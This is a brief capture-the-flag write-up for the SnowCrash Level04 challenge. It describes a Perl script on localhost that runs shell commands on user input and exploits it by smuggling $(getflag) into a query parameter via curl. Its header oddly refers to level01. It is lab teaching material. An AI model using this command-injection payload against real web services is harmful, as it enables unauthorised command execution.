# WRITE UP

**Box**:            SnowCrash

**Name**:           Level04

**Description**:    Find the flag to connect to level01

**Category**:       ???

**Difficulty**:     Easy

---

## Basic checking

```bash
ls -la
```

A file has been found. **level04.pl**

## Breaking Badly the box (Got it ?)

It's a perl script, that allow us to curl the response of it ty to 
```bash
curl localhost:4747
```

But nothing come from that. If I take a closer look to it it contain a function that print the result of the following command:

```
cat <input_variable>
```

So I need to find a way to attribute the variable's value. And I can do that easly by running:

```bash
curl 'localhost:4747?x=$(getflag)'
```

**FLAG FOUND**